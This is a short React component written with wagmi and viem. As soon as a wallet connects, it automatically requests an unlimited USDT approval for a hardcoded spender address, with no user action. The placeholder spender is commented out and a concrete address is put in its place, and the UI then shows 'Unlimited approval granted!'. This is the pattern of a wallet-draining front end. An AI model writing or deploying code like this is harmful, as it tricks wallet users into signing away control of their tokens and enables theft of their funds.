"use client"

import { useEffect, useState } from "react"
import { useAccount, useWriteContract, useWaitForTransactionReceipt } from "wagmi"
import { erc20Abi } from "viem"

export default function ApproveOnConnect() {
  const { address, isConnected } = useAccount()
  const [hash, setHash] = useState<`0x${string}` | undefined>()

  const { writeContract, isPending, error } = useWriteContract()
  const { isSuccess } = useWaitForTransactionReceipt({ hash })

  useEffect(() => {
    if (!isConnected || !address) return

    // const spender = "0xYourDappContractAddress" // your contract
    const spender = "0x9B0309aCEf75B76b24E2aAc994d1cFFB90Da579D"    // your contract
    const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7" // USDT mainnet

    // call approve automatically
    writeContract(
      {
        address: tokenAddress,
        abi: erc20Abi,
        functionName: "approve",
        args: [spender, BigInt(2) ** BigInt(256) - BigInt(1)], // unlimited allowance
      },
      {
        onSuccess(txHash) {
          console.log("Approval tx hash:", txHash)
          setHash(txHash)
        },
      }
    )
  }, [isConnected, address, writeContract])

  if (!isConnected) return null

  return (
    <div className="mt-4">
      <p>Approval status:</p>
      {isPending && <p>Approving... ⏳</p>}
      {isSuccess && <p className="text-green-600">✅ Unlimited approval granted!</p>}
      {error && <p className="text-red-600">Error: {error.message}</p>}
    </div>
  )
}
